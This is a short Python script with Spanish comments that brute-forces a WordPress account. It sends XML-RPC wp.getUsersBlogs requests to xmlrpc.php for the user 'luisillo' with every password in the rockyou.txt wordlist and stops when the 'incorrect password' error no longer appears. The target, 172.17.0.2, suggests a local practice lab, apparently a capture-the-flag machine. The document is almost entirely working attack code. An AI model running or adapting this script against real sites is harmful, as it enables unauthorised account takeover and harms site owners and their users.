import requests
import signal

url = 'http://172.17.0.2/wordpress/xmlrpc.php'
usuario = 'luisillo'

# Variable rockyou.txt
password = 'rockyou.txt'

# Recogemos la salida con ctrl + C
def salir(sig, frame):
    exit()

signal.signal(signal.SIGINT, salir)

# Abrimos rockyou.txt como diccionario y leemos cada linea
with open(password, 'r', encoding='latin-1') as diccionario:
    list_passwords = diccionario.readlines()

for each_password in list_passwords:
    # Limpiamos los espacios
    each_password = each_password.strip()

    # El payload que usamos en cada vuelta para realizar la consulta
    # Lo he sacado de una plantilla en xmlrpc php servebolt 
    payload = f"""
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>luisillo</value></param>
    <param><value>{each_password}</value></param>
    </params>
    </methodCall>
    """

    print(f"Probamos con {each_password}")

    # Esta es la respuesta que hacemos con la estructura del payload como dato y la url
    respuesta = requests.post(url, data=payload, allow_redirects=False)

    # Realmente puedes poner cualquier texto que veas al introducir mal un usuario y contraseña
    # El error es: Nombre de usuario o contraseña incorrectos.
    # Previamente montamos la plantilla y usamos 
    # curl -X POST http://172.17.0.2/wordpress/xmlrpc.php -d@xmlrpc.xml

    if 'contraseña incorrectos' not in respuesta.text:
        print(f"Contraseña correcta: {each_password}")
        exit()

    